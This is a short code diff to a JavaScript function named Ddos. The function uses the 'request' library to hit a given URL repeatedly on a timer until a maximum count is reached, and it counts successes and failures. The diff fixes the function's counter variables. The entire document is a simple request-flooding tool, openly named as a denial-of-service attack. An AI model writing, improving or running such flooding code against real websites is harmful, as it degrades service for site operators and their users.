@@ -2,9 +2,10 @@ import request from "request";
 function Ddos(link, max) {
   let failed = 0;
   let count = 0;
+  let ok = 0;
   const inter = setInterval(() => {
     count++;
-    request(link, (error) => (!error ? ok++ : err++));
+    request(link, (error) => (!error ? ok++ : failed++));
     if (count > max) {
       clearInterval(inter);
     }
